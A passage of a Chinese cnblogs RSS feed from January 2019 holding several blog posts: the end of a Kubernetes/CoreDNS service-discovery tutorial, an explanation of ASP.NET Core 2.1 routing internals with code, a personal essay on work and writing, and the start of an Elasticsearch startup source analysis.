&lt;p&gt;如上，可以看到数据成功返回，但是直接使用集群IP&lt;code&gt;10.111.25.49&lt;/code&gt;，这也有点太低级了，其实我们可以直接使用域名：&lt;code&gt;http://demo-api-service&lt;/code&gt;，修改后如下：&lt;/p&gt;
&lt;pre class=&quot;yaml&quot;&gt;
&lt;code&gt;  env:
    - name: ApiBaseUrl
      value: &quot;http://demo-api-service&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;应用该配置，然后刷新浏览器，可以看到完美运行，这是因为&lt;strong&gt;CoreDNS(Kube-DNS)&lt;/strong&gt;帮我们完成了域名解析。&lt;/p&gt;
&lt;p&gt;在Kubernetes 1.11中，CoreDNS已经实现了基于DNS的服务发现的GA，可作为kube-dns插件的替代品。这意味着CoreDNS将作为各种安装工具未来发布版本中的一个选项来提供。事实上，kubeadm团队选择将其作为Kubernetes 1.11的默认选项。&lt;/p&gt;
&lt;p&gt;CoreDNS是一个通用的、权威的DNS服务器，提供与Kubernetes后向兼容但可扩展的集成。它解决了kube-dns所遇到的问题，并提供了许多独特的功能，可以解决各种各样的用例。&lt;/p&gt;
&lt;p&gt;DNS服务器监控kubernetes创建服务的API, 并为每个服务创建一组dns记录。如果在整个群集中启用了dns, 所有Pod都会使用它作为DNS服务器。比如我们的&lt;code&gt;demo-api-service&lt;/code&gt;服务，DNS服务器会创建一条&quot;my-service.my-ns&quot;也就是&lt;code&gt;10.111.25.49:demo-api-service.default&lt;/code&gt;的dns记录，因为我们的Web应用和Api应用同一个命名空间中，所以可以直接使用&lt;code&gt;demo-api-service&lt;/code&gt;来访问。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;本文带领大家一步一步部署了一个最简单的ASP.NET Core MVC + WebApi的微服务程序，介绍了Kubernetes中最基本的三个概念：&lt;strong&gt;Pod&lt;/strong&gt;，&lt;strong&gt;Deployment&lt;/strong&gt;，&lt;strong&gt;Service&lt;/strong&gt;，相信大家对Kubernetes也有了一个全面的认识。&lt;/p&gt;
&lt;p&gt;虽然Kubernetes整个体系是非常复杂的，但是不用担心，一开始我们不用去求甚解，最重要的是先跑起来，后续我会和大家一起逐步深入，由简到繁，愉快的掌握Kubernetes。&lt;/p&gt;
&lt;p&gt;附本文所用示例代码：&lt;a href=&quot;https://github.com/RainingNight/AspNetCoreDocker&quot; class=&quot;uri&quot;&gt;https://github.com/RainingNight/AspNetCoreDocker&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id=&quot;相关资料&quot;&gt;相关资料：&lt;/h2&gt;
</description>
<pubDate>Mon, 07 Jan 2019 23:52:00 +0000</pubDate>
<dc:creator>雨夜朦胧</dc:creator>
<og:description>Kubernetes简介 Kubernetes是Google基于Borg开源的容器编排调度引擎，作为CNCF（Cloud Native Computing Foundation）最重要的组件之一，它的</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/RainingNight/p/first-aspnetcore-app-in-k8s.html</dc:identifier>
</item>
<item>
<title>ASP.NET Core 2.1 : 十五.图解路由(2.1 or earler) - FlyLolo</title>
<link>http://www.cnblogs.com/FlyLolo/p/ASPNETCore2_15.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/FlyLolo/p/ASPNETCore2_15.html</guid>
<description>&lt;p&gt;本文通过一张图来看一下路由的配置以及请求处理的机制,。&lt;/p&gt;

&lt;p&gt;路由主要有两个主要功能：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;将请求的URL与已定义的路由进行匹配，找到该URL对应的处理程序并传入该请求进行处理。&lt;/li&gt;
&lt;li&gt;根据已定义的路由生成URL&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;这两个功能看起来这两个是相反的。&lt;/p&gt;
&lt;h2&gt;A.路由的配置&lt;/h2&gt;
&lt;p&gt;路由的两个功能都离不开一个基本的操作：路由的基本配置。在Startup中默认通过 routes.MapRoute(name: &quot;default&quot;,template: &quot;{controller=Home}/{action=Index}/{id?}&quot;)定义，&lt;/p&gt;
&lt;p&gt;当然我们还可以继续 routes.MapRoute(。。。);  这样就定义了一系列的路由匹配方式组成一个路由表，例如这样：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
app.UseMvc(routes =&amp;gt;&lt;span&gt;
{
    routes.MapRoute(name: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, template: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Hello&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    routes.MapRoute(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;flylolo/{code}/{name}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, MyRouteHandler.Handler);
    routes.MapRoute(name: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;default&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, template: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{controller=Home}/{action=Index}/{id?}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;每一个MapRoute会生成一个Route，第二个MapRoute看起来有些特殊，我们可以传入一个自定义的RequestDelegate（本例为MyRouteHandler.Handler）来处理“flylolo/{code}/{name}”这样的请求，&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; MyRouteHandler
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;async&lt;/span&gt;&lt;span&gt; Task Handler(HttpContext context)
        {
            &lt;/span&gt;&lt;span&gt;await&lt;/span&gt; context.Response.WriteAsync(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MyRouteHandler&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;它会被封装成一个&lt;span&gt;&lt;span&gt;RouteHandler&lt;/span&gt;（new RouteHandler(MyRouteHandler.Handler)）&lt;/span&gt;赋值给Route的target属性，而对于另外两种没有指定的，Route的target属性默认会被指定为&lt;span&gt;MvcRouteHandler&lt;/span&gt; ，如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/548134/201901/548134-20190107161013283-2056472410.jpg&quot; alt=&quot;&quot; width=&quot;577&quot; height=&quot;294&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;B.Handler的选择&lt;/h2&gt;
&lt;p&gt;当请求进入之后，根据此路由表对该URL进行逐一匹配，并将请求交给匹配到的路由的target（即MvcRouteHandler或RouteHandler），调用 &lt;span class=&quot;cnblogs_code&quot;&gt;_target.RouteAsync(context);&lt;/span&gt; ，在这个方法中，若是MvcRouteHandler会对请求的Controller和Action验证，若验证成功，则对context（是一个RouteContext）的Handler属性赋值一个匿名方法；若是RouteHandler则会直接将其封装的RequestDelegate（本例为MyRouteHandler.Handler）赋值给RouteContext.Handler.&lt;/p&gt;
&lt;h2&gt;C.请求处理&lt;/h2&gt;
&lt;p&gt;经过Handler的选择后，若RouteContext.Handler不为空，则调用RouteContext.Handler(HttpContext)对请求进行处理。&lt;/p&gt;
&lt;h2&gt;D.其他&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;回想一下中间件，这个是不是和app.Map(&lt;/span&gt;&lt;span class=&quot;hljs-string&quot;&gt;&lt;span&gt;&quot;/test&quot;, XXHandle)这样配置中间件的方式有点像，当请求路径是/test的时候，请求交由XXHandle处理&lt;/span&gt;，同样是Map，对比着更容易理解。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;下面通过一张图看一下路由配置和请求处理的流程。&lt;/p&gt;

&lt;p&gt; &lt;a href=&quot;https://img2018.cnblogs.com/blog/548134/201901/548134-20190104161629818-1260435333.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/548134/201901/548134-20190104161629818-1260435333.png&quot; alt=&quot;点击看大图&quot; width=&quot;724&quot; height=&quot;757&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;  为了方便查看，对几个“重点对象”做了颜色标识（&lt;a href=&quot;https://img2018.cnblogs.com/blog/548134/201901/548134-20190104161629818-1260435333.png&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;点击图片可以看大图&lt;/span&gt;&lt;/a&gt;）：&lt;/p&gt;

&lt;ol&gt;&lt;li&gt;路由的初始化配置一切从Startup开始，之前在中间件的文章中介绍过，一般是通过多个UseXXX的方式将多个中间件组成“请求处理管道”，而在这里通过UseMvc方法进行配置，传入routes.MapRoute(...)这样的一个或多个配置。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;接下来会New一个&lt;/p&gt;
&lt;p&gt;&lt;span&gt;RouteBuilder&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;，顾名思义就是一个Route的创建者，通过调用传进来的一个或多个routes.MapRoute()方法生成多个Route，并配置默认的Handler。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
                &lt;span&gt;var&lt;/span&gt; routes = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; RouteBuilder(app)
                {
                    DefaultHandler &lt;/span&gt;= app.ApplicationServices.GetRequiredService&amp;lt;MvcRouteHandler&amp;gt;&lt;span&gt;(),
                };

                configureRoutes(routes);&lt;span&gt;//调用Startup中的&lt;/span&gt;&lt;/span&gt;&lt;span&gt;routes.MapRoute(...)方法&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;          ①调用&lt;span&gt;RouteBuilder&lt;/span&gt;的Build方法，生成一个&lt;span&gt;RouteCollection&lt;/span&gt;。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
        &lt;span&gt;public&lt;/span&gt;&lt;span&gt; IRouter Build()
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; routeCollection = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; RouteCollection();

            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; route &lt;span&gt;in&lt;/span&gt;&lt;span&gt; Routes)
            {
                routeCollection.Add(route);
            }

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; routeCollection;
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;          ②&lt;span&gt;RouteCollection&lt;/span&gt;实现IRouteCollection和IRouter接口，他是在Startup中的配置组成的集合。&lt;/p&gt;
&lt;p&gt;          ③&lt;span&gt;RouterMiddleWare&lt;/span&gt;就是专门用于进行路由处理的中间件，在此将&lt;span&gt;RouteCollection&lt;/span&gt;作为中间件&lt;span&gt;RouterMiddleWare&lt;/span&gt;的参数，并将这个中间件插入管道中。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; RouterMiddleware
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt;&lt;span&gt; IRouter _router; &lt;span&gt;//就是&lt;/span&gt;&lt;span data-mce-=&quot;&quot;&gt;RouteCollection

        &lt;/span&gt;&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt;&lt;span&gt; Task Invoke(HttpContext httpContext);

    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　2. 请求处理流程&lt;/p&gt;
&lt;p&gt;　       ④请求的处理流程在&lt;span&gt;RouterMiddleWare&lt;/span&gt;的invoke()方法中。&lt;/p&gt;
&lt;p&gt;　　    ⑤请求首先会被封装成一个&lt;span&gt;RouteContext&lt;/span&gt;，本质就是将httpContext、_router(也就是&lt;span data-mce-=&quot;&quot;&gt;RouteCollection&lt;/span&gt;)包装到一个对象里。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
  &lt;span&gt;var&lt;/span&gt; context = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; RouteContext(httpContext);
  context.RouteData.Routers.Add(_router);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; RouteContext
{
   &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; RouteData _routeData;
   &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; RequestDelegate Handler ；
   &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; HttpContext HttpContext；&lt;span&gt;//&lt;/span&gt;&lt;span&gt;简单的赋值&lt;/span&gt;
   &lt;span&gt;public&lt;/span&gt;&lt;span&gt; RouteData RouteData；
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;          ⑥调用_router(也就是&lt;span data-mce-=&quot;&quot;&gt;&lt;span&gt;RouteCollection&lt;/span&gt;)&lt;/span&gt;的RouteAsync(&lt;span&gt;context&lt;/span&gt;)方法，在其中遍历每一个路由&lt;/p&gt;
&lt;p&gt;          ⑦若与请求URL匹配，则将对应的Handler赋值给&lt;span&gt;context&lt;/span&gt;.Handler。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt;&lt;span&gt; Task RouteAsync(RouteContext context)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 快照备份&lt;/span&gt;
            &lt;span&gt;var&lt;/span&gt; snapshot = context.RouteData.PushState(&lt;span&gt;null&lt;/span&gt;, values: &lt;span&gt;null&lt;/span&gt;, dataTokens: &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;遍历&lt;/span&gt;
            &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; Count; i++&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; route = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;[i];
                context.RouteData.Routers.Add(route);

                &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;
                {
                    &lt;/span&gt;&lt;span&gt;await&lt;/span&gt; route.RouteAsync(context);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;若匹配，则给context.Handler赋值&lt;/span&gt;

                    &lt;span&gt;if&lt;/span&gt; (context.Handler != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                    {
                        &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                    }
                }
                &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt;
                {
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (context.Handler == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                    {
                        snapshot.Restore();&lt;span&gt;//通过快照还原&lt;/span&gt;
                    }
                }
            }
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;              ⑧在&lt;span&gt;RouterMiddleWare&lt;/span&gt;的invoke()方法中，调用新赋值的&lt;span&gt;context&lt;/span&gt;.Handler处理HttpContext;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
httpContext.Features[&lt;span&gt;typeof&lt;/span&gt;(IRoutingFeature)] = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; RoutingFeature()
{
    RouteData &lt;/span&gt;=&lt;span&gt; context.RouteData,
};

&lt;/span&gt;&lt;span&gt;await&lt;/span&gt; context.Handler(context.HttpContext);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 三、其他&lt;/p&gt;
&lt;p&gt;      由于文章写的比较早各种原因一直没有写完，现在发现2.2版本之后，启用了新的路由方案，还是把这章完成了发出来，有愿意看的可以参考一下，下一篇文章介绍一下2.2版的新的路由方案，至于通过路由生成URL部分，就暂时不写了。&lt;/p&gt;
</description>
<pubDate>Mon, 07 Jan 2019 23:43:00 +0000</pubDate>
<dc:creator>FlyLolo</dc:creator>
<og:description>本文通过一张图来看一下路由的配置以及请求处理的机制,。 一、概述 路由主要有两个主要功能： 这两个功能看起来这两个是相反的。 A.路由的配置 路由的两个功能都离不开一个基本的操作：路由的基本配置。在S</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/FlyLolo/p/ASPNETCore2_15.html</dc:identifier>
</item>
<item>
<title>想清楚你究竟想成为什么样的人了吗？ - 沉默王二</title>
<link>http://www.cnblogs.com/qing-gee/p/10236874.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/qing-gee/p/10236874.html</guid>
<description>&lt;p&gt;&lt;img title=&quot;&quot; src=&quot;http://upload-images.jianshu.io/upload_images/1179389-ad113818b09848ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;文/沉默王二&lt;/p&gt;
&lt;h3 id=&quot;h1&quot;&gt;1.&lt;/h3&gt;
&lt;p&gt;如果非要我实话实话的话，我并不喜欢当前的这份“工作”。&lt;/p&gt;
&lt;p&gt;我上班的公司只有两个人，一个人是老板，另外一个人就是我。也许这并不算是一份工作，因为我和公司之间并没有签订劳动合同：老板可以随时把我辞退，让我感受一下这个“寒冬”的冷酷无情，我也可以随时把老板炒鱿鱼，然后我们双方并不会负任何法律责任。&lt;/p&gt;
&lt;p&gt;当然了，这也并不是我不喜欢这份工作的原因，毕竟老板每个月还会给我发一份工资——其实也不应该说是工资，而是劳动补贴。&lt;/p&gt;
&lt;p&gt;我每天可以9点去上班，甚至更晚，有时候甚至可以不去，留老板一个人在办公室孤独地工作。如果家庭需要照顾的话，我可以一周不去公司，全天候在家。但工资是照发的。&lt;/p&gt;
&lt;p&gt;别人问我：“你做什么工作呀？”我挺不好意思回答的，我既不能说自己是无业游民，也不能说自己在创业——幸好，有一个职业很照顾我，那就是“自由职业”。&lt;/p&gt;
&lt;p&gt;照这么说下去的话，你可能会羡慕我，说我身在福中不知福——时间自由，还有钱拿，到哪去找这么一份好工作呢？当我对前途感到迷茫、对现状感到焦虑的时候，我也这么安慰我自己。&lt;/p&gt;
&lt;p&gt;但你和我似乎忽略了一点：&lt;strong&gt;唯一让人有工作满足感的方法就是从事你认为伟大的工作&lt;/strong&gt;。说得直白点就是，我不爱我当前的这份工作，它一点也不伟大。&lt;/p&gt;
&lt;p&gt;那该怎么办呢？&lt;/p&gt;
&lt;p&gt;找一份伟大的工作，如果还没有找到，那就继续找。&lt;/p&gt;
&lt;h3 id=&quot;h2&quot;&gt;2.&lt;/h3&gt;
&lt;p&gt;上小学的时候，我就梦想过当一名伟大的作家——真的。&lt;/p&gt;
&lt;p&gt;上初中的时候，我获得了一次学校的“小记者”荣誉称号，全校只有一个名额。在当时，连不轻易表扬我的父亲也在饱经沧桑的脸上流露出了无上的荣耀。&lt;/p&gt;
&lt;p&gt;那时候，我的作文写得是真的好，不仅被我们班的语文老师在课堂上表扬，还被其他班级的语文老师认可，有一个高高的姓孙的年轻老师还送我了好几本诗集。老师们一致的认为，我是一颗好苗，只要细心培养，未来当一名作家也不是什么困难的事儿——我自己也这么想当然的认为。&lt;/p&gt;
&lt;p&gt;可我慢慢地，慢慢地了解到，所谓“当一名作家”，真的只是一个梦而已。&lt;/p&gt;
&lt;p&gt;高中毕业后，我上了大学，这是意料之中的事情。可意料之外的是，我竟然被调剂到了计算机网络专业，学习了Java编程语言，成为了一名正儿八经的程序员。&lt;/p&gt;
&lt;p&gt;随着时间的推移，我把小时候的梦想丢了，我开始接受“从事我们真正喜欢的工作是不现实的”这一观点。在理想与面包之间，大多数人往往会毫不犹豫地选择后者。我也是。&lt;/p&gt;
&lt;p&gt;直到最近，我才找到了那份伟大的工作——写作——我不仅可以做一名优秀的程序员，还可以成为一名优秀的作者（尽管作者离作家还有很长的距离）。&lt;/p&gt;
&lt;p&gt;我虽然不热爱那份“挣钱”的工作，但它可以给我面包吃；我真正热爱的“写作”虽然还没有带给我可观的收益，但它是真正激励着我向前冲的“动力因素”——有挑战性，能够获得读者的认可，还能够促进个人成长。&lt;/p&gt;
&lt;p&gt;更为关键的是，&lt;strong&gt;工作的自由度可以为我提供充分的写作时间，而写作上的成就可以减轻我在工作中产生的焦虑&lt;/strong&gt;——我已经找到了很好的平衡点。&lt;/p&gt;
&lt;h3 id=&quot;h3&quot;&gt;3.&lt;/h3&gt;
&lt;p&gt;读书、写作、敲代码——这正是我所热爱的那份伟大的工作。为了完成这份有挑战性的工作，我该做些什么让它变得更有意义呢？&lt;/p&gt;
&lt;p&gt;1）读书&lt;/p&gt;
&lt;p&gt;要知道，书就是最好的导师，只有不断地读书，才能“腹有诗书气自华”。&lt;/p&gt;
&lt;p&gt;我读书的目的是提高自己，也就是收集信息、获得知识，这也被称为功利性阅读。功利性阅读计划的步骤是：提出目标、根据目标评估自身情况、构建知识体系，然后合理规划时间、完成计划。&lt;/p&gt;
&lt;p&gt;2019年的第一天，我就给自己制定了一份详细的读书计划，感兴趣的朋友可以点击&lt;a href=&quot;http://www.qingmiaokeji.cn/article/7&quot;&gt;链接&lt;/a&gt;查看。&lt;/p&gt;
&lt;p&gt;2）写作&lt;/p&gt;
&lt;p&gt;2019年的第一周，机械工业出版社的卞老师就找我和小伙伴筹备新书，这可真是一个好的开始呀。&lt;/p&gt;
&lt;p&gt;&lt;img title=&quot;&quot; src=&quot;https://upload-images.jianshu.io/upload_images/1179389-d27f6fe1f663db35.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;除了书稿之外，我还要坚持每周更新两篇文章。周一的主题为程序人生，周五的主题为技术编程。如果时间来得及的话，就再写一篇书评。&lt;/p&gt;
&lt;p&gt;既然写作是我热爱的工作，那么就应该为此付出最大的努力。毕竟写作让我的世界变得越来越开阔，认识了很多比我优秀的人；我的思维变得越来越严谨，遇到问题时能够快速地想到解决办法；我的灵魂变得越来越有趣，越来越多的读者开始关注我；我的生活变得越来越富有，毕竟写作还是会有稿费的。&lt;/p&gt;
&lt;p&gt;3）敲代码&lt;/p&gt;
&lt;p&gt;上大学之前，我从来没想过我将来会成为一名程序员——我当时根本就不知道还有这样一种职业；我父母不知道，我的同学们也不知道。&lt;/p&gt;
&lt;p&gt;但一路走来，我爱上了编程（敲代码）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;我并不想把编程当做一个副业，恰恰相反，我希望一辈子都是一名善良的程序员，并且利用我的时间，创造出一些有价值的东西&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;在之前的很长一段时间内，我都是一个沉默寡言的程序员，在与人交流的过程中经常会表达不清楚自己的观点。为了做出改变，我最近参加了不少线下的交流会，在觥筹交错之间，我发现了人生无限的可能。&lt;/p&gt;
&lt;p&gt;比如说，我也可以身着正装，并且脸不红心不跳的在众人面前表达自己（见下图）。友情提示，不要学我把西服的最后一粒扣子也扣上，因为它的名字叫做never。&lt;/p&gt;
&lt;p&gt;&lt;img title=&quot;&quot; src=&quot;https://upload-images.jianshu.io/upload_images/1179389-8d77fe242cf79367.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;h4&quot;&gt;4.&lt;/h3&gt;
&lt;p&gt;托马斯·杰弗逊（美国第三任总统，与华盛顿、本杰明·富兰克林并称为美利坚开国三杰）曾说过：“&lt;strong&gt;我生命中最幸福的时刻就是在家庭的温暖怀抱中度过了那些时光&lt;/strong&gt;。”&lt;/p&gt;
&lt;p&gt;在人的一生当中，除了工作，还有很多重要的东西，比如说与家人之间的亲情，与朋友之间的友谊。&lt;/p&gt;
&lt;p&gt;现实生活当中，我们可以看到很多事业上非常成功，但家庭关系却一团糟的人，比如说伟大的斯蒂夫·乔布斯——乔布斯改变了世界，我们不得不承认，但他与第一任妻子的关系，女儿的关系，真的非常糟糕——感兴趣的朋友可以阅读《乔布斯传》。&lt;/p&gt;
&lt;p&gt;家庭关系，表面上看起来不需要付出很多的时间来维护，但实际情况却不是这样。一旦我们忽视了，家庭关系就会出现严重的问题。&lt;/p&gt;
&lt;p&gt;想一想，当你应酬完很晚才回到家后，看到一直在等你的妻子脸上挂着“埋怨”两个字的时候，你的第一反应是什么？&lt;/p&gt;
&lt;p&gt;是“我可是为了家庭，才出去喝酒的啊，你有什么好埋怨的？”还是“对不起，老婆，让你久等了，谢谢你的担心，我休息一下就没事了。”&lt;/p&gt;
&lt;p&gt;两种截然不同的态度，能够直接反映出家庭关系是糟糕还是和睦。不管怎样，我要提醒你的是——与家人的关系是幸福生活的重要源泉。&lt;/p&gt;
&lt;h3 id=&quot;h5&quot;&gt;5.&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;我们的人生，需要一份伟大的工作，也需要一个幸福的家庭；如果还有一些不错的朋友，那真是太好了！&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 07 Jan 2019 23:05:00 +0000</pubDate>
<dc:creator>沉默王二</dc:creator>
<og:description>我们的人生，需要一份伟大的工作，也需要一个幸福的家庭；如果还有一些不错的朋友，那真是太好了！</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/qing-gee/p/10236874.html</dc:identifier>
</item>
<item>
<title>Elasticsearch源码分析 | 单节点的启动和关闭 - whirlys</title>
<link>http://www.cnblogs.com/whirly/p/10236827.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/whirly/p/10236827.html</guid>
<description>&lt;p&gt;本文主要简要介绍Elasticsearch单节点的启动和关闭流程。Elasticsearch版本：6.3.2&lt;/p&gt;
&lt;h4 id=&quot;相关文章&quot;&gt;相关文章&lt;/h4&gt;
&lt;p&gt;1、&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI1NDU0MTE1NA==&amp;amp;mid=2247483683&amp;amp;idx=1&amp;amp;sn=0d77085a0234b2c5b7c679e62200e6f5&amp;amp;chksm=e9c2ed2edeb56438010b5f5d487bcb7f0529c85d50ac7c858e1a8e3a9279c15007341170c5ac&amp;amp;mpshare=1&amp;amp;scene=1&amp;amp;srcid=0107YiaAuX3EDzO9XLEBCDHq#rd&quot;&gt;Google Guice 快速入门&lt;/a&gt;&lt;br/&gt;2、&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI1NDU0MTE1NA==&amp;amp;mid=2247483691&amp;amp;idx=1&amp;amp;sn=3c7175d318bce6728c2105d27ae6bafe&amp;amp;chksm=e9c2ed26deb56430289edabd15cef1a0cf777c5dfe4f4ad5013655e9d3607958e0fe16ac5436&amp;amp;mpshare=1&amp;amp;scene=1&amp;amp;srcid=01079MoANk2UViY4CftnPRVo#rd&quot;&gt;Elasticsearch 中的 Guice&lt;/a&gt;&lt;br/&gt;3、&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI1NDU0MTE1NA==&amp;amp;mid=2247483676&amp;amp;idx=1&amp;amp;sn=1d88a883ce21d7dcacd073a8fa85dbfc&amp;amp;chksm=e9c2ed11deb56407879ba0b22a4ef96916f8a9e7931e1efb99df57991966a3dc475eb3e23101&amp;amp;mpshare=1&amp;amp;scene=1&amp;amp;srcid=0107L5Z1RW5tpECUU13Ymxwg#rd&quot;&gt;教你编译调试Elasticsearch 6.3.2源码&lt;/a&gt;&lt;br/&gt;4、&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI1NDU0MTE1NA==&amp;amp;mid=2247483695&amp;amp;idx=1&amp;amp;sn=c434b83ca67cfd1e2e0cbf416b3ee28e&amp;amp;chksm=e9c2ed22deb56434978446cd05c8b8235783a3f28ce940b601206fb76a8025e1a69a33e1c64a&amp;amp;mpshare=1&amp;amp;scene=1&amp;amp;srcid=0107LgY2cJ3bNjMZFLX58mVz#rd&quot;&gt;Elasticsearch 6.3.2 启动过程&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;创建节点&quot;&gt;创建节点&lt;/h4&gt;
&lt;p&gt;Elasticsearch的启动引导类为 Bootstrap 类，在创建节点 Node 对象之前，Bootstrap 会解析配置和进行一些安全检查等&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.laijianfeng.org/20190107_223512.png&quot; alt=&quot;创建节点对象&quot;/&gt;&lt;/p&gt;
&lt;p&gt;environment 对象主要是解析出来的配置信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.laijianfeng.org/20190107_223749.png&quot; alt=&quot;environment 对象&quot;/&gt;&lt;/p&gt;
